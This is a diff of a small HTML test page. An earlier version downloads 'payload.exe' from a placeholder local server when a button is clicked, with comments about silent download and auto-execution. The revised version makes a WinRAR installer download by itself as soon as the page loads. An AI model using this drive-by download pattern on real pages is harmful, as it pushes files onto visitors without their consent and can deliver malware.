@@ -3,27 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GG</title>
+    <title>Auto Test</title>
 </head>
 <body>
-    <h1>Test1</h1>
-    <p>OnePiece</p>
-    <button onclick="execute()">Esc</button>
+    <h1>test</h1>
+    <p>Test</p>
 
     <script>
-        function execute() {
-            // Simulating silent download and execution in a controlled environment
+        // 
+        window.onload = function() {
             var link = document.createElement('a');
-            link.href = 'http://your-local-server/payload.exe';  // This should be a file served by your local server.
-            link.download = 'payload.exe';  // You could even set this to automatically download in some cases.
-
-            // Trigger the download
+            link.href = 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe';  // 
+            link.download = 'winrar-x64-701.exe';
+            document.body.appendChild(link);
             link.click();
-
-            // Optionally: Auto-run payload using scripting (ONLY in isolated test environments)
-            // Use of 'ActiveXObject' or similar methods for silent execution in a real attack would be illegal
-            alert('Shanks');
-        }
+            document.body.removeChild(link);  // 
+        };
     </script>
 </body>
 </html>
